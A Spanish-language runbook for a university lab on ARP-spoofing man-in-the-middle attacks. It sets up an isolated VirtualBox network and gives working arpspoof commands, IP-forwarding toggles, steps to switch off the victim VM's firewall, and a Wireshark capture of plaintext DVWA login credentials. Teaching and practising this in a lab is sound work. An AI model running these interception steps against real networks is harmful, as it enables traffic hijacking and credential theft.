# TP MitM con ARP spoofing: runbook

## Roles

- Atacante (arpspoof + Wireshark): tu PC Debian, interfaz `vboxnet1` (192.168.57.1). Hace de "máquina Kali" con las tools instaladas en el host.
- Host (hace el ping y el login a DVWA desde el navegador): VM REMnux, o FlareVM si preferís Windows.
- Víctima / 0wn3d (servidor DVWA): VM WIN10-ETHICAL-HACKER.

Las tres quedan en la red host-only `vboxnet1` (192.168.57.0/24, DHCP 192.168.57.101 a 254, host 192.168.57.1). No toca tu LAN ni tu WiFi.

Si querés un Kali VM real como atacante, es simétrico: instalás ahí `dsniff` y `wireshark`, y usás tu PC como Host. Los comandos son los mismos con las IPs intercambiadas.

## 0. VM WIN10: ya arreglada

Hecho el 2026-10-10: import desde `/mnt/games/WIN10-ETHICAL-HACKER(1).ova` (11.56 GB, completo, con manifest). La VM arranca, quedó con 2 vCPU, 4096 MB, disco de 21.4 GB y NIC1 host-only `vboxnet1`. MAC nuevo: `08:00:27:AB:D8:71`.

Ojo: `~/Downloads/WIN10-ETHICAL-HACKER.ova` está truncado (3.62 GB de 11.56 GB) y no sirve. El OVA bueno es el de `/mnt/games`. El VDI viejo de 0 bytes quedó como `.0bytes.bak` y se puede borrar.

Para arrancarla: GUI de VirtualBox, o `VBoxManage startvm "WIN10-ETHICAL-HACKER" --type gui`. El primer boot post-import tarda por detección de hardware; el botón ACPI no respondió en la prueba headless, apagala desde el menú de Windows.

## 1. Red y preparación del host

Prender WIN10 y REMnux (o FlareVM). Anotar IPs: en el PC `ip -br a show vboxnet1`, en REMnux `ip -br a`, en WIN10 `ipconfig`. Si `vboxnet1` está DOWN: `sudo ip link set vboxnet1 up` (si no tiene IP: `sudo ip addr add 192.168.57.1/24 dev vboxnet1`).

ufw tiene `DEFAULT_FORWARD_POLICY=DROP` y va a bloquear el Resultado 3 (el HTTP reenviado). Permitir el reenvío solo entre las patas del lab:

```bash
sudo ufw route allow in on vboxnet1 out on vboxnet1
```

Al terminar: `sudo ufw route delete allow in on vboxnet1 out on vboxnet1`. Alternativa rápida para el rato del TP: `sudo ufw disable` y después `sudo ufw enable`.

`ip_forward` hoy está en 1 (lo deja Docker o Mullvad). El TP lo baja a 0 en el Resultado 1: si hay contenedores corriendo, pierden salida mientras dure. Al final se restaura en 1, no en 0.

Firewall de la víctima: el TP pide la VM sin reglas de firewall. Windows bloquea echo request y el puerto 80 por defecto. Dentro de la VM WIN10, como administrador: `netsh advfirewall set allprofiles state off` (alternativa puntual: `netsh advfirewall firewall add rule name="ICMPv4-In" protocol=icmpv4:8,any dir=in action=allow`). Es una VM de lab aislada, no lo hagas en tu PC real. Al terminar: `netsh advfirewall set allprofiles state on`.

## 2. Instalar tools

PC atacante:

```bash
sudo apt update
sudo apt install -y dsniff wireshark python3-docx
sudo dpkg-reconfigure wireshark-common    # responder Yes (captura sin root)
sudo usermod -aG wireshark $USER          # después cerrar y abrir sesión
```

Verificar: `command -v arpspoof wireshark`. Mientras no reinicies sesión, abrí Wireshark con `sudo wireshark`.

WIN10 víctima, solo si no trae DVWA. Primero verificar `http://localhost/dvwa` dentro de la VM. Si existe, no instales nada. Si falta:

1. XAMPP de apachefriends.org, instalar con Apache, MySQL y PHP. En el panel de XAMPP: Start en Apache y MySQL.
2. Bajar https://github.com/digininja/DVWA/archive/refs/heads/master.zip y descomprimir en `C:\xampp\htdocs\dvwa`.
3. Copiar `config\config.inc.php.dist` a `config\config.inc.php` (dejar `db_user=root` y `db_password` vacío).
4. Abrir `http://localhost/dvwa/setup.php` y Create/Reset Database. Login de prueba: `http://localhost/dvwa/login.php`, admin / password.

La VM no tiene internet en host-only. Si necesitás los instaladores, bajalos en el PC y servilos: `cd ~/Downloads && python3 -m http.server 8000 --bind 192.168.57.1`; desde WIN10 entrás a `http://192.168.57.1:8000`.

## 3. Resultado 1: sin forwarding

Primero un ping desde el Host a la víctima para que el ARP ya exista. Después, en el PC atacante:

```bash
sudo sysctl -w net.ipv4.ip_forward=0
sudo arpspoof -i vboxnet1 -t <IP_HOST> <IP_WIN10> -r
```

Ejemplo con IPs fijas: `sudo arpspoof -i vboxnet1 -t 192.168.57.51 192.168.57.50 -r`. Dejar ese terminal corriendo.

Wireshark en el PC: interfaz `vboxnet1`, filtro `icmp`. Chequear en el Host que el ARP quedó envenenado: `ip neigh show <IP_WIN10>` tiene que mostrar la MAC del PC (`0a:00:27:00:00:01`).

Ping desde el Host:

```bash
ping -c 4 <IP_WIN10>
```

Esperado: Wireshark muestra solo `Echo (ping) request`, sin reply, y el ping da 100% de pérdida. Print pedido: Wireshark + consola del ping.

Por qué: el kernel del PC recibe los paquetes dirigidos a su MAC pero no los reenvía.

## 4. Resultado 2: con forwarding

Sin cortar arpspoof, en el PC:

```bash
sudo sysctl -w net.ipv4.ip_forward=1
```

Ping otra vez desde el Host: `ping -c 4 <IP_WIN10>`.

Esperado: Wireshark muestra request y reply, y el ping responde. Reiniciar la captura antes para que el print quede limpio.

## 5. Resultado 3: credenciales de DVWA

Mantener el forwarding en 1 y arpspoof corriendo. Filtro Wireshark: `http.request.method == "POST"` (o `http`).

Desde el navegador del Host: `http://<IP_WIN10>/dvwa/login.php`, login admin / password.

En Wireshark: click derecho en el POST > Follow > HTTP Stream. Se ve `username=admin&password=password` en texto plano. Print pedido: el POST desplegado o el stream seguido.

## 6. Limpieza

```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo ufw route delete allow in on vboxnet1 out on vboxnet1
sudo ip neigh flush all
```

- Ctrl+C en arpspoof.
- WIN10 como admin: `arp -d *` y reactivar firewall con `netsh advfirewall set allprofiles state on`.
- REMnux: `sudo ip neigh flush all`.

## 7. Armar el Word

Guardar los tres prints como `resultado1.png`, `resultado2.png` y `resultado3.png` en esta carpeta y correr:

```bash
python3 armar_tp_docx.py
```

Genera `TP-MitM-ARP.docx` con los tres prints y sus epígrafes, listo para subir a Blackboard.
